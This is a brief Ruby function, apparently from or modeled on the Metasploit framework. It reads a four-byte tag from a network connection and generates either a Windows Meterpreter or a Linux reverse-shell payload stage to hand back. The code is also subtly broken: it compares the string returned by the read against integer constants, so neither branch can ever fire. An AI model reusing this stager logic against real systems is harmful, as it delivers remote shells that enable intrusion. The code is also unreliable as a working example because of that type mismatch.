def handle_connection(conn)
  # XXX magic
  tag = conn.read(4)
  stage = case tag
    when 0x11223344
      framework.payloads.create("windows/meterpreter/reverse_tcp").generate_stage
    when 0x41414141
      framework.payloads.create("linux/x86/shell/reverse_tcp").generate_stage
    end
  p stage
end
